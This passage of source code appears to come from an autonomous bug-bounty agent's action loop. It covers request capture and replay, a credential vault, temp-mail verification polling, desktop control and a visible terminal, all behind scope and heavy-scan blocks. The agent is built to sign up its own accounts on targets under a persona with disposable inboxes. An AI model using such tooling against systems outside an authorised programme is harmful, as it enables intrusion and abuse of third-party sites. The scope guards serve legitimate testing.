        try { deps.record(huntId, { type: 'plan_block', tool: 'load_skill', detail: pendingPlan.skill, turnsSince: pendingPlan.turnsSince, via: 'human-mode' }); } catch { /* best-effort */ }
        say(`Pending-plan gate stopped a re-pull of "${pendingPlan.skill}" — its plan is still open (${pendingPlan.when}).`);
        observation =
          `BLOCKED — PLAN ALREADY OPEN: you pulled the "${pendingPlan.skill}" card ${pendingPlan.when} and have sent no ${pendingPlan.topic.label} probe since. The card is already in your record — pulling it again changes nothing. Close the plan one of two ways: send its first probe now (the card's steps end in a probe), or close it with record_coverage as not_applicable and the reason it does not apply here.`;
        note({ action: `plan_block: load_skill ${pendingPlan.skill}`, why: thinkingText, result: `re-pull blocked — ${pendingPlan.topic.label} plan open since ${pendingPlan.when}, no probe sent`, learned: 'A pulled card is a plan, not a probe — send the probe or close the plan.' });
      } else {
        toolCall('load_skill', name);
        try {
          observation = String(loadSkill(name) || '').slice(0, 2600) || 'That skill card is empty.';
        } catch {
          observation = 'Skill cards are unavailable this turn — work from your briefing and your leads.';
        }
        // Lane AD: a fresh failure joins the hunt's failed-name
        // memory the moment it is observed, so a verbatim repeat
        // later in this same session is answered from the record.
        if (skillKey && observation.includes('No skill card named')) {
          failedSkills.set(skillKey, { name: name.trim().slice(0, 60), asks: 1 });
        }
        note({ action: `load_skill: ${name}`, why: thinkingText, result: clipResult(observation), learned: '' });
      }
    } else if (kind === 'proxy_start') {
      // Lane U: start the intercept proxy + dashboard inside the
      // hunter's own container and route its Chromium through it.
      // NOT dedupe-gated (an idempotent machine control — re-running
      // it only reports state, like recall) and NOT scope-gated (it
      // touches only the hunter's own machine; no traffic leaves).
      toolCall('proxy_start', '');
      const res = await getIntercept().start(huntId);
      observation = res.observation || '(no observation)';
      if (res.ok) say('Intercept proxy started — browser traffic is being captured.');
      note({ action: 'proxy_start', why: thinkingText, result: clipResult(observation), learned: '' });
    } else if (kind === 'intercept_list') {
      // Lane U: read the hunter's own capture file. NOT dedupe-gated
      // and NOT scope-gated — a read of its own notebook, like recall.
      toolCall('intercept_list', '');
      const res = await getIntercept().list(huntId);
      observation = res.observation || '(no observation)';
      note({ action: 'intercept_list', why: thinkingText, result: clipResult(observation), learned: '' });
    } else if (kind === 'intercept_read') {
      // Lane U: one captured flow in full. Same read-only treatment
      // as intercept_list.
      toolCall('intercept_read', `#${action.index ?? ''}`);
      const res = await getIntercept().read(huntId, action.index);
      observation = res.observation || '(no observation)';
      note({ action: `intercept_read: #${action.index ?? ''}`, why: thinkingText, result: clipResult(observation), learned: '' });
    } else if (kind === 'intercept_replay') {
      // Lane U: Burp-Repeater work — resend one captured request
      // with the hunter's modifications. This DOES send traffic, so
      // it is treated exactly like a shell probe: dedupe-gated
      // (above, on the replay signature), scope-checked on the FINAL
      // url (a captured third-party request the page made, or a url
      // override, may not be replayed out of programme), paced by
      // the same requests-per-minute cap, and executed through the
      // same pipeline exec as shell commands.
      const read = await getIntercept().read(huntId, action.index);
      if (!read.ok || !read.entry) {
        observation = read.observation || 'That capture could not be read — run intercept_list and pick a real index.';
      } else {
        const built = buildReplayRequest(read.entry.flow, {
          url: action.url,
          headers: action.headers,
          body: action.body,
        });
        if (!built.ok) {
          observation = built.error;
        } else {
          const badUrl = scopeViolation(built.url, target, parsedScope);
          if (badUrl) {
            observation = `BLOCKED — OUT OF SCOPE: ${badUrl} is not part of this programme. A replay may only be sent to ${target} and its listed assets. Nothing was sent.`;
            say(`Out-of-scope replay blocked: ${built.url.slice(0, 120)}`);
          } else {
            if (minShellGapMs > 0 && lastShellAt > 0) {
              const wait = lastShellAt + minShellGapMs - deps.now();
              if (wait > 0) await deps.sleep(wait);
            }
            toolCall('intercept_replay', replaySignature(action));
            try {
              const exec = await getExec();
              const result = await exec(huntId, target, buildReplayCurl(built));
              lastShellAt = deps.now();
              const combined = `${result.stdout || ''}\n${result.stderr || ''}`.trim();
              const statusLine = /^HTTP\/\S+ \d{3}[^\n]*/m.exec(combined);
              const head = `Replayed capture #${read.entry.index} as ${built.method} ${built.url} — ${statusLine ? statusLine[0] : 'no HTTP response received'}.`;
              if (combined.length > OBS_BUDGET) {
                let handle = '';
                try {
                  handle = deps.spill(huntId, combined);
                } catch { /* spill is best-effort */ }
                observation =
                  `${head}\n${combined.slice(0, OBS_BUDGET)}` +
                  `\n[response truncated on screen — ${combined.length} chars total${handle ? `, saved in full as artifact ${handle}` : ''}]`;
              } else {
                observation = combined ? `${head}\n${combined}` : `${head} (the replay produced no output)`;
              }
              if (result.code && result.code !== 0) {
                observation += `\n[curl exit code ${result.code}]`;
              }
            } catch (err) {
              observation = `Replay failed to run: ${err.message || err}`;
            }
          }
        }
      }
      note({ action: `intercept_replay: #${action.index ?? ''}`, why: thinkingText, result: clipResult(observation), learned: '' });
    } else if (kind === 'save_credential') {
      // Lane AI: vault seam. The brain creates accounts itself under
      // the Obfinity persona; the password is vaulted server-side
      // and NEVER written to the record — only the handle is. Two
      // modes: password supplied (vaulted + scrubbed from every
      // recorded surface via sessionSecrets) or omitted (the server
      // generates one and shows it as a ONE-TURN observation — the
      // brain types it immediately; the observation rides the
      // in-memory screen only and is scrubbed out of the log push
      // below). A temp-mail inbox is provisioned best-effort for
      // verification mail. NOT dedupe-gated (a vault write, not
      // traffic) and NOT scope-gated beyond the site itself.
      const site = String(action.site || target);
      const username = String(action.username || generatePersonaUsername());
      let password = String(action.password || '');
      let generated = false;
      if (!password) { password = generatePassword(20); generated = true; }
      sessionSecrets.add(password);
      let inbox = null;
      try {
        const ib = await deps.createInbox();
        inbox = { provider: ib.provider, address: ib.address, token: ib.token || null };
      } catch { inbox = null; }
      const rec = saveCredential({ site, username, password, huntId, inbox });
      toolCall('save_credential', rec.handle);
      observation = generated
        ? `Saved credential ${rec.handle} for ${site} as ${username}. One-time password for THIS turn only (it will never be shown again and is never written to the record): ${password} — type it now with browser_type into the password field (target: the password field's label, e.g. "Password"), then submit. Your temp-mail inbox for verification mail is ${inbox ? inbox.address : '(none — mail provider unreachable)'}; poll it with fetch_verification_code and this handle.`
        : `Saved credential ${rec.handle} for ${site} as ${username}. It is vaulted; the record keeps the handle only. Temp-mail inbox: ${inbox ? inbox.address : '(none — mail provider unreachable)'}.`;
      note({ action: `save_credential: ${rec.handle}`, why: thinkingText, result: `credential vaulted for ${site} as ${username}`, learned: '' });
    } else if (kind === 'use_saved_credential') {
      // Lane AI: fill a login form from the vault WITHOUT the
      // password ever appearing in text. The server performs the
      // clicks + types itself via guiTools — those inner calls are
      // not loop actions, so no value touches toolCall/note; only
      // the handle is recorded. Without field labels the brain is
      // sent back to snapshot first.
      const handle = String(action.handle || '');
      const rec = handle ? getCredential(handle) : null;
      if (!rec) {
        observation = `No saved credential ${handle || '(empty)'} — save one first with save_credential, then use its handle.`;
      } else {
        touchCredential(handle);
        const uField = String(action.usernameField || '');
        const pField = String(action.passwordField || '');
        if (!uField || !pField) {
          observation = `Credential ${handle} is ready for ${rec.site} (username ${rec.username}). Snapshot the login page and call use_saved_credential again with "usernameField" and "passwordField" as the visible labels of the two fields — the server will fill them from the vault without ever showing the password in text.`;
        } else {
          const gui = getGui();
          // INFINITY LEVEL: the old code ignored every result and
          // reported "Filled the login fields…" unconditionally —
          // on a wrong page the driver refuses the click and the
          // fill never happens, but the brain was told it did
          // (the false-success hole in the wrong-page guard's
          // coverage). Each step is checked; the first refusal
          // stops the chain and its observation IS the answer.
          const clickU = await gui.click(huntId, uField);
          const typeU = clickU && clickU.ok !== false ? await gui.type(huntId, uField, rec.username, false) : null;
          const clickP = typeU && typeU.ok !== false ? await gui.click(huntId, pField) : null;
          const typeP = clickP && clickP.ok !== false ? await gui.type(huntId, pField, rec.password, false) : null;
          const failed = [clickU, typeU, clickP, typeP].find((r) => r && r.ok === false);
          if (failed) {
            observation = failed.observation || `Could not fill the login fields for ${rec.site} — the browser refused the action (${failed.error || 'unknown reason'}). Snapshot the page and check you are on the login page first.`;
            notePageUrl(observation);
            noteSnapshot(failed);
          } else {
            toolCall('use_saved_credential', handle);
            observation = `Filled the login fields for ${rec.site} from vaulted credential ${handle} (username ${rec.username}). Submit with browser_click when ready.`;
          }
        }
      }
      note({ action: `use_saved_credential: ${handle}`, why: thinkingText, result: clipResult(observation), learned: '' });
    } else if (kind === 'fetch_verification_code') {
      // Lane AI: poll the credential's temp-mail inbox for a
      // verification code. The code is a ONE-TURN observation: it
      // rides the in-memory screen, joins the session secret set
      // (so any later typing or quoting of it is scrubbed from the
      // record), and is never written to events, reasoning rows,
      // or the vault. Timeout is a reportable blocker, not a loop.
      const handle = String(action.handle || '');
      const rec = handle ? getCredential(handle) : null;
      if (!rec || !rec.inbox || !rec.inbox.address) {
        observation = `No temp-mail inbox on credential ${handle || '(empty)'} — the inbox may have failed to provision when the credential was saved. Note it and move on.`;
      } else {
        toolCall('fetch_verification_code', handle);
        const res = await deps.pollCode(rec.inbox, { sleep: deps.sleep });
        if (res.ok) {
          sessionSecrets.add(res.code);
          observation = `Verification code for ${rec.site} (one-turn only — type it now with browser_type into the code field (target: that field's label); it will not be shown again and is never written to the record): ${res.code} (from ${res.from || 'inbox'}${res.subject ? `, subject: ${res.subject}` : ''})`;
          markVerified(handle);
        } else if (res.reason === 'timeout') {
          observation = `No verification mail arrived for ${rec.site} after ${res.polls} polls — the site may block this temp-mail domain (${String(rec.inbox.address).split('@')[1] || 'unknown'}). Record this as a blocker: do not retry forever; note the domain and move on.`;
        } else {
          observation = `Could not poll the inbox for ${rec.site}: ${res.reason || 'provider error'}. Note it and move on.`;
        }
      }
      note({ action: `fetch_verification_code: ${handle}`, why: thinkingText, result: 'verification-code poll completed (code itself never recorded)', learned: '' });
    } else if (kind === 'request_details') {
      // DYNAMIC DETAILS (27 Oct 2026, owner order): the agent ASKS the
      // owner for details it needs instead of creating its own account.
      // The request appears as a card below the chat; the owner fills
      // it and the values arrive on the next screen (one-turn only).
      // Only the request id/title are ever recorded — never the fields'
      // values. A pending request refuses a second one; a re-ask for
      // details already provided re-shows them instead of asking again.
      const title = String(action.title || '').trim();
      const fields = Array.isArray(action.fields) ? action.fields : [];
      const site = String(action.site || target || '');
      // SELF-AUTH CHAIN (27 Oct 2026, owner order): "account":"owner"
      // means the OWNER's own existing account (ask first is correct).
      // Anything else is a FRESH account the brain could create itself
      // — the ask is refused until the self path has been tried for
      // this site (save/use/fetch_verification_code in the hunt's
      // events). The brain must attempt first, then ask.
      const accountKind = String(action.account || 'fresh').trim().toLowerCase();
      let history = [];
      try { history = (typeof deps.readEvents === 'function' ? (deps.readEvents(huntId) || []) : []); } catch { history = []; }
      const pending = getPendingRequests(huntId);
      const already = listDetailRequests(huntId).find((r) =>
        (r.status === 'filled' || r.status === 'used') && r.title === title &&
        Array.isArray(r.fields) && r.fields.length === fields.length &&
        r.fields.every((f, i) => f.key === String(fields[i]?.key || '')));
      if (pending && pending.length) {
        observation = `A details request ("${pending[0].title}") is already open in the chat — wait for the owner to answer it. Do NOT re-request and do NOT re-attempt the blocked action this turn.`;
      } else if (already) {
        const values = getFilledValues(already.id);
        if (values) {
          for (const v of Object.values(values)) if (typeof v === 'string' && v) sessionSecrets.add(v);
          const shown = already.fields.map((f) => `${f.label}: ${values[f.key] ?? ''}`).join('; ');
          observation = `The owner ALREADY gave you these details for "${already.title}" (one-turn only — use them NOW with browser_type; they will not be shown again and are never written to the record): ${shown} — do NOT ask again.`;
        } else {
          observation = `The owner already provided details for "${already.title}" but they are no longer available — ask again only if you still need them, with a fresh request_details.`;
        }
      } else if (accountKind !== 'owner' && !hasSelfAuthAttempt(history, site)) {
        observation = `Ask refused — you have not tried to make this account YOURSELF yet for ${site || 'this target'}. The order is: save_credential first (it vaults the login and provisions your temp-mail inbox), then use_saved_credential to fill the form, then fetch_verification_code for the verification mail. Only ask the owner AFTER that path fails — and say what failed. If this is the OWNER's own existing account (not a fresh one), re-ask with "account":"owner".`;
      } else {
        const created = createDetailRequest({ huntId, title, fields, site });
        if (!created.ok) {
          observation = `Could not ask the owner for details: ${created.error}. Note it and move on — do NOT retry the same request this turn.`;
        } else {
          toolCall('request_details', created.request.id);
          observation = `Your details request "${created.request.title}" is now open in the chat below — the owner will fill it in. WAIT for the next turn: the details arrive on your screen (one-turn only, never written to the record). Do NOT re-attempt the blocked action this turn.`;
        }
      }
      note({ action: `request_details: ${title.slice(0, 120)}`, why: thinkingText, result: 'details request opened for the owner (values never recorded)', learned: '' });
    } else if (kind === 'browser_open') {
      const url = String(action.url || '');
      const bad = scopeViolation(url, target, parsedScope);
      if (bad) {
        observation = `BLOCKED — OUT OF SCOPE: ${bad} is not part of this programme. Nothing was opened.`;
        say(`Out-of-scope browser_open blocked: ${url.slice(0, 120)}`);
      } else {
        toolCall('browser_open', url);
        const res = await getGui().open(huntId, url);
        if (res && res.degraded === true) pendingDegraded = true; // Lane AF
        observation = res.observation || '(no observation)';
        notePageUrl(observation);
        noteSnapshot(res);
      }
      note({ action: `browser_open: ${url.slice(0, 120)}`, why: thinkingText, result: clipResult(observation), learned: '' });
    } else if (kind === 'browser_snapshot') {
      toolCall('browser_snapshot', '');
      const res = await getGui().snapshot(huntId);
      observation = res.observation || '(no observation)';
      notePageUrl(observation);
      noteSnapshot(res);
    } else if (kind === 'browser_click') {
      const text = String(action.text || '');
      toolCall('browser_click', text);
      const res = await getGui().click(huntId, text);
      if (res && res.degraded === true) pendingDegraded = true; // Lane AF
      observation = res.observation || '(no observation)';
      notePageUrl(observation);
      noteSnapshot(res);
      // INFINITY LEVEL: a successful click marks its element
      // interacted-with in the parsed page state — the click
      // coverage the brain chooses from next turn.
      if (res && res.ok !== false) {
        try { sessionPageState = markElementClicked(sessionPageState, currentPageUrl, text); savePageState(huntId, sessionPageState); } catch { /* best-effort */ }
      }
      // MISSION Stage 5 (31 Oct 2026): post-navigation scope guard. A
      // click can follow a link off the programme's assets — if the
      // landing URL is out of scope, flag it loudly. The brain must
      // navigate back; it must not interact with the out-of-scope page.
      try {
        const postClickBad = scopeViolation(currentPageUrl, target, parsedScope);
        if (postClickBad) {
          observation = `${observation}\n[SCOPE WARNING] OUT OF SCOPE: ${postClickBad} is not part of this programme. Navigate back to ${target} — do not interact with this page.`;
          say(`browser_click landed out of scope: ${String(postClickBad).slice(0, 120)}`);
        }
      } catch { /* scope warning never breaks the loop */ }
      note({ action: `browser_click: ${text.slice(0, 80)}`, why: thinkingText, result: clipResult(observation), learned: '' });
    } else if (kind === 'browser_type') {
      const text = String(action.text || '');
      // GUI-TYPE-TARGET (28 Oct 2026): the brain names the field —
      // a type without a target is not attempted at all (the old
      // code typed into whatever was focused; the DVWA login put
      // 'password' into the username field and still "succeeded").
      const fieldTarget = String(action.target || action.selector || '').trim();
      toolCall('browser_type', fieldTarget ? `${fieldTarget} ← ${text.slice(0, 80)}` : text.slice(0, 80));
      let res;
      if (!fieldTarget) {
        res = { ok: false, observation: 'browser_type needs a "target" — the label or CSS selector of the field to type into (e.g. "Username" or "input[name=password]"). Take a browser_snapshot and name the field; never type blind.' };
      } else {
        res = await getGui().type(huntId, fieldTarget, text, action.submit === true);
      }
      if (res && res.degraded === true) pendingDegraded = true; // Lane AF
      observation = res.observation || '(no observation)';
      notePageUrl(observation);
      noteSnapshot(res);
      // INFINITY LEVEL: a successful type marks the field typed-
      // into — the record of what the page's inputs received.
      if (res && res.ok !== false) {
        try { sessionPageState = markTypedInto(sessionPageState, currentPageUrl); savePageState(huntId, sessionPageState); } catch { /* best-effort */ }
      }
      note({ action: `browser_type: ${fieldTarget ? `${fieldTarget} ← ` : ''}${text.slice(0, 80)}`, why: thinkingText, result: clipResult(observation), learned: '' });
    } else if (kind === 'screenshot') {
      toolCall('screenshot', '');
      const res = await getGui().screenshot(huntId);
      observation = res.observation || '(no observation)';
      notePageUrl(observation);
      noteSnapshot(res);
      // OCR-TO-FILER (1 Nov 2026): the brain sees hashes on screen but will
      // not transcribe them into text; the auto-filer only reads text. Run
      // desktop OCR and append it so the filer sees the evidence directly.
      // This bypasses the model's transcription failure (permanent fix).
      try {
        const ocrRes = await captureScreenMap(huntId, deps);
        if (ocrRes && ocrRes.ok && ocrRes.map) {
          observation += `\n\n[OCR screen text — auto-filer reads this]:\n${ocrRes.map}`;
        }
      } catch { /* OCR is best-effort; screenshot works without it */ }
    } else if (kind === 'desktop_snapshot') {
      // WHOLE-OS CONTROL: read the live desktop (windows + focused
      // app) via xdotool on :99. Perception, like browser_snapshot
      // — but it IS a loop action (tool_call), so the counters can
      // measure snapshots acted on. A desktop that is down is a
      // reportable state, not a silent empty list: stderr/code
      // distinguish it from "no windows".
      toolCall('desktop_snapshot', '');
      try {
        const res = await deps.execRaw(huntId, DESKTOP_WINDOWS_CMD, 15000, { bypassTmux: true });
        const out = String((res && res.stdout) || '');
        const errText = String((res && res.stderr) || '');
        if (!out.trim() && (errText || (res && res.code && res.code !== 0))) {
          observation = `The desktop is not running right now (xdotool could not reach display :99${errText ? `: ${errText.slice(0, 160)}` : ''}). Open a page with browser_open first — that starts the desktop — then take desktop_snapshot again.`;
        } else {
          sessionDesktopState = mergeDesktopState(sessionDesktopState, parseDesktopWindows(out));
          observation = desktopStateLines(sessionDesktopState, { target }).join('\n');
        }
      } catch (err) {
        observation = `Desktop snapshot failed: ${err.message || err}. Open a page with browser_open first — that starts the desktop — then try again.`;
      }
      note({ action: 'desktop_snapshot', why: thinkingText, result: clipResult(observation), learned: '' });
    } else if (kind === 'desktop_click') {
      // WHOLE-OS CONTROL: focus a window by title (resolved
      // deterministically from the last desktop_snapshot) and send
      // it a click. No snapshot yet, or no matching window, is a
      // named refusal — the observation lists the windows that DO
      // exist. Nothing is executed on a guess. The tool_call
      // records the RAW name the brain gave, so the dedupe gate's
      // candidate (same raw name) matches the history exactly.
      const winName = String(action.window || '');
      const win = resolveWindowForClick(sessionDesktopState.windows, winName);
      if (!win) {
        const known = (sessionDesktopState.windows || []).map((w) => w.title).filter(Boolean);
        observation = known.length
          ? `No window matches "${winName}". Windows on this desktop: ${known.join(' | ')}. Take desktop_snapshot to refresh the list, then desktop_click one of them by title.`
          : `No window matches "${winName}" — and no desktop snapshot has been taken yet, so no window titles are known. Take desktop_snapshot first, then desktop_click one of its windows by title.`;
      } else {
        toolCall('desktop_click', winName);
        try {
          const res = await deps.execRaw(huntId, desktopClickCommand(win), 15000, { bypassTmux: true });
          if (String((res && res.stdout) || '').includes('clicked')) {
            sessionDesktopState = markWindowInteracted(sessionDesktopState, win.title);
            observation = `Focused window "${win.title}" (clicked it). It now receives your desktop_key keystrokes — Tab/Return/arrows to move inside it, or type text with desktop_key.`;
          } else {
            observation = `Could not click window "${win.title}" (xdotool reported ${String((res && res.stderr) || 'failure').slice(0, 160)}). The window may have closed — take desktop_snapshot to refresh the list.`;
          }
        } catch (err) {
          observation = `Desktop click failed: ${err.message || err}. Take desktop_snapshot to refresh the window list.`;
        }
      }
      note({ action: `desktop_click: ${winName.slice(0, 80)}`, why: thinkingText, result: clipResult(observation), learned: '' });
    } else if (kind === 'desktop_key') {
      // WHOLE-OS CONTROL: keys or literal text to the focused
      // window. Keystrokes are whitelist-validated BEFORE any exec
      // (parseDesktopKeys) — an unvalidated keysym would be an
      // injection into the xdotool command line. A refusal names
      // the allowed keys; nothing is executed on a guess. The
      // tool_call records the RAW keys/text, so the dedupe gate's
      // candidate matches the history exactly.
      const keys = String(action.keys || '');
      const text = String(action.text || '');
      if (keys) {
        const parsed = parseDesktopKeys(keys);
        if (!parsed.ok) {
          observation = `Keys not sent — ${parsed.error}. Send one keystroke: modifiers ctrl/alt/shift/super/meta plus one key (Return, Tab, Escape, space, BackSpace, Delete, arrows, Home, End, Page_Up, Page_Down, F1-F12, or a single letter/digit), e.g. {"action":"desktop_key","keys":"ctrl+l"}. To type words, use {"action":"desktop_key","text":"..."} instead.`;
        } else {
          toolCall('desktop_key', keys);
          try {
            const res = await deps.execRaw(huntId, desktopKeyCommand(parsed.keys), 15000, { bypassTmux: true });
            observation = String((res && res.stdout) || '').includes('key_sent')
              ? `Sent keys ${parsed.keys} to the focused window (${sessionDesktopState.activeTitle || 'unknown window'}). Take desktop_snapshot or browser_snapshot to see what changed.`
              : `Keys ${parsed.keys} may not have reached the focused window (xdotool reported ${String((res && res.stderr) || 'failure').slice(0, 160)}). Take desktop_snapshot to check which window is focused.`;
          } catch (err) {
            observation = `Desktop keys failed: ${err.message || err}. Take desktop_snapshot to check the focused window.`;
          }
        }
      } else if (text) {
        toolCall('desktop_key', text.slice(0, 80));
        try {
          const res = await deps.execRaw(huntId, desktopTypeCommand(text), 15000, { bypassTmux: true });
          observation = String((res && res.stdout) || '').includes('typed')
            ? `Typed ${text.length} chars into the focused window (${sessionDesktopState.activeTitle || 'unknown window'}). Take desktop_snapshot or browser_snapshot to see what changed.`
            : `Typing may not have reached the focused window (xdotool reported ${String((res && res.stderr) || 'failure').slice(0, 160)}). Take desktop_snapshot to check the focused window.`;
        } catch (err) {
          observation = `Desktop typing failed: ${err.message || err}. Take desktop_snapshot to check the focused window.`;
        }
      } else {
        observation = 'Nothing sent — give "keys" (e.g. "ctrl+l", "Return") or "text" (words to type) with desktop_key.';
      }
      note({ action: `desktop_key: ${(keys || text).slice(0, 80)}`, why: thinkingText, result: clipResult(observation), learned: '' });
    } else if (kind === 'desktop_screenshot') {
      // WHOLE-OS CONTROL: the full desktop frame (scrot on :99),
      // saved as a hunt artifact via the owner's poller route —
      // the brain gets the TEXT desktop state with the observation
      // (it never sees the image); the owner gets the picture.
      toolCall('desktop_screenshot', '');
      try {
        const shot = await getDesktopScreenshot()(huntId);
        if (shot && shot.ok) {
          try {
            const res = await deps.execRaw(huntId, DESKTOP_WINDOWS_CMD, 15000, { bypassTmux: true });
            sessionDesktopState = mergeDesktopState(sessionDesktopState, parseDesktopWindows(String((res && res.stdout) || '')));
          } catch { /* the state read is best-effort beside the shot */ }
          observation = `Desktop screenshot saved as artifact ${shot.name} in your hunt workspace (the owner watches this desktop live). What the desktop shows:\n${desktopStateLines(sessionDesktopState, { target }).join('\n')}`;
        } else {
          observation = `Desktop screenshot failed: ${(shot && shot.error) || 'unknown error'}. Open a page with browser_open first — that starts the desktop — then try again.`;
        }
      } catch (err) {
        observation = `Desktop screenshot failed: ${err.message || err}.`;
      }
      note({ action: 'desktop_screenshot', why: thinkingText, result: clipResult(observation), learned: '' });
    } else if (kind === 'see_screen') {
      // SCREEN-SEEING (27 Oct 2026, owner order): the brain LOOKS at
      // the desktop itself — screenshot -> OCR words + coordinates ->
      // a text map it can read and click from. Perception, like
      // desktop_snapshot, so it is NOT dedup-gated (looking twice is
      // how the brain confirms the screen changed). A missing OCR
      // install is a named state, not a silent empty map.
      toolCall('see_screen', '');
      try {
        const res = await captureScreenMap(huntId, deps);
        observation = res.ok
          ? `${res.map}\n(To act on what you see: desktop_click_at with the (x, y) from the map, or desktop_key to type. Then see_screen again to confirm the screen changed.)`
          : screenMapErrorLine(res.error);
      } catch (err) {
        observation = `Could not read the screen: ${err.message || err}. Take desktop_snapshot instead.`;
      }
      note({ action: 'see_screen', why: thinkingText, result: clipResult(observation), learned: '' });
    } else if (kind === 'desktop_click_at') {
      // SCREEN-SEEING: click at a point FROM THE SCREEN MAP. The
      // coordinates are validated BEFORE any exec (parseClickAt) — an
      // unvalidated number would be an injection into xdotool. The
      // tool_call records the validated point, so the dedupe gate's
      // candidate (same point) matches the history exactly.
      const parsed = parseClickAt(action);
      if (!parsed.ok) {
        observation = `Click not sent — ${parsed.error}. Take see_screen first and use a point from the map.`;
      } else {
        toolCall('desktop_click_at', `${parsed.x},${parsed.y}`);
        try {
          const res = await deps.execRaw(huntId, desktopClickAtCommand(parsed.x, parsed.y), 15000, { bypassTmux: true });
          observation = String((res && res.stdout) || '').includes('clicked')
            ? `Clicked at (${parsed.x}, ${parsed.y}). Take see_screen to confirm what changed.`
            : `Click at (${parsed.x}, ${parsed.y}) may not have landed (xdotool reported ${String((res && res.stderr) || 'failure').slice(0, 160)}). Take see_screen to check the screen.`;
        } catch (err) {
          observation = `Desktop click failed: ${err.message || err}. Take see_screen to check the screen.`;
        }
      }
      note({ action: `desktop_click_at: ${String(action.x ?? '')},${String(action.y ?? '')}`, why: thinkingText, result: clipResult(observation), learned: '' });
    } else if (kind === 'desktop_terminal') {
      // HUMAN-BRAIN (26 Oct 2026): GUI-VISIBLE TERMINAL — the
      // command runs in a terminal window ON the GUI desktop, typed
      // visibly, so the owner watches it live. Same rules as the
      // headless shell action, enforced identically: scope gates
      // (heavy-scan + out-of-scope) run FIRST; the output ledger
      // answers a repeat from the saved output; the dedupe gate
      // (which maps this kind to the shell signature — see
      // gatedCandidate) has already blocked a 3rd+ run before this
      // branch; the shell pacing gap applies between runs. The run
      // is recorded under the shell signature, so a visible run and
      // a headless run of one command are one action. The output
      // comes back WITHOUT re-running: the typed line tees it into
      // a per-hunt log file and the loop reads that file back.
      const command = String(action.command || '').replace(/[\r\n]+/g, ' ').trim().slice(0, DESKTOP_TERMINAL_COMMAND_CAP);
      if (!command) {
        observation = 'Empty terminal command — nothing ran. Give a real command.';
      } else if (heavyScanViolation(command, parsedScope)) {
        observation = `BLOCKED by the programme rules: "${command.slice(0, 120)}" is automated/heavy scanning, which this programme forbids. Work like a human: single targeted probes, one at a time.`;
        say(`Programme rules blocked a heavy-scan terminal command: ${command.slice(0, 120)}`);
      } else {
        const badUrl = commandScopeViolation(command, target, parsedScope);
        if (badUrl) {
          observation = `BLOCKED — OUT OF SCOPE: ${badUrl} is not part of this programme. Only test ${target} and its listed assets. Nothing was sent.`;
          say(`Out-of-scope terminal command blocked: ${command.slice(0, 120)}`);
        } else {
          const forceTerm = action.force === true && String(action.why || '').trim().length > 0;
          const termSig = actionSignature('shell', command);
          const termSaved = !forceTerm ? findOutput(sessionOutputs, termSig) : null;
          if (termSaved) {
            try { deps.record(huntId, { type: 'output_recall', tool: 'desktop_terminal', detail: scrub(command), via: 'human-mode' }); } catch { /* best-effort */ }
            observation = recallObservation(termSaved, { nowMs: deps.now() });
          } else {
            if (minShellGapMs > 0 && lastShellAt > 0) {
              const wait = lastShellAt + minShellGapMs - deps.now();
              if (wait > 0) await deps.sleep(wait);
            }
            toolCall('desktop_terminal', command);
            const logFile = desktopTerminalLogFile(huntId);
            const typed = desktopTerminalWrapCommand(command, logFile);
            // (1) Desktop up? The other desktop actions tell the
            // brain to open a page first; a terminal action must
            // work from a cold desktop, so it starts it here when
            // xdotool cannot reach :99.
            let windowsOut = '';
            try {
              const res = await deps.execRaw(huntId, DESKTOP_WINDOWS_CMD, 15000, { bypassTmux: true });
              windowsOut = String((res && res.stdout) || '');
            } catch { /* desktop down — start it below */ }
            if (!windowsOut.trim()) {
              try {
                await getStartDesktop()(huntId);
                await deps.sleep(4000);
                const res = await deps.execRaw(huntId, DESKTOP_WINDOWS_CMD, 15000, { bypassTmux: true });
                windowsOut = String((res && res.stdout) || '');
              } catch { /* start failure reports below */ }
            }
            if (!windowsOut.trim()) {
              observation = 'The desktop is not running right now (xdotool could not reach display :99, and starting it did not bring it up). Open a page with browser_open first — that starts the desktop — then try desktop_terminal again.';
            } else {
              sessionDesktopState = mergeDesktopState(sessionDesktopState, parseDesktopWindows(windowsOut));
              // (2) Terminal open? Find one by window class; launch
              // when none is visible.
              let termWin = null;
              try {
                const res = await deps.execRaw(huntId, DESKTOP_TERMINAL_WINDOWS_CMD, 15000, { bypassTmux: true });
                termWin = (parseDesktopWindows(String((res && res.stdout) || '')).windows || [])[0] || null;
              } catch { /* launch below */ }
              if (!termWin) {
                try {
                  await deps.execRaw(huntId, DESKTOP_TERMINAL_LAUNCH_CMD, 15000, { bypassTmux: true });
                  await deps.sleep(2500);
                  const res = await deps.execRaw(huntId, DESKTOP_TERMINAL_WINDOWS_CMD, 15000, { bypassTmux: true });
                  termWin = (parseDesktopWindows(String((res && res.stdout) || '')).windows || [])[0] || null;
                } catch { /* reports below */ }
              }
              if (!termWin) {
                observation = 'Could not open a terminal window on the desktop (xfce4-terminal did not appear). Take desktop_snapshot to see what is on the desktop, then try again.';
              } else {
                // (3) Focus, type visibly, Return.
                let typedOk = false;
                try {
                  const clickRes = await deps.execRaw(huntId, desktopClickCommand(termWin), 15000, { bypassTmux: true });
                  const typeRes = await deps.execRaw(huntId, desktopTypeCommand(typed), 15000, { bypassTmux: true });
                  const keyRes = await deps.execRaw(huntId, desktopKeyCommand('Return'), 15000, { bypassTmux: true });
                  typedOk = String((clickRes && clickRes.stdout) || '').includes('clicked')
                    && String((typeRes && typeRes.stdout) || '').includes('typed')
                    && String((keyRes && keyRes.stdout) || '').includes('key_sent');
                  sessionDesktopState = markWindowInteracted(sessionDesktopState, termWin.title || 'Terminal');
                } catch { typedOk = false; }
                if (!typedOk) {
                  observation = `Could not type into the terminal window "${termWin.title || 'Terminal'}" — the focus, type, or Return step failed. Take desktop_snapshot to check the desktop, then try again.`;
                } else {
                  lastShellAt = deps.now();
                  // (4) Let it run, read the tee log back, screenshot.
                  await deps.sleep(3000);
                  let logText = '';
                  try {
                    const logRes = await deps.execRaw(huntId, `cat ${shellQuote(logFile)} 2>/dev/null || echo __DT_NO_LOG__`, 15000, { bypassTmux: true });
                    logText = String((logRes && logRes.stdout) || '');
                  } catch { /* empty log reports below */ }
                  let shotName = '';
                  try {
                    const shot = await getDesktopScreenshot()(huntId);
                    if (shot && shot.ok) shotName = shot.name;
                    try {
                      const res = await deps.execRaw(huntId, DESKTOP_WINDOWS_CMD, 15000, { bypassTmux: true });
                      sessionDesktopState = mergeDesktopState(sessionDesktopState, parseDesktopWindows(String((res && res.stdout) || '')));
                    } catch { /* the state read is best-effort beside the shot */ }
                  } catch { /* screenshot is best-effort beside the output */ }
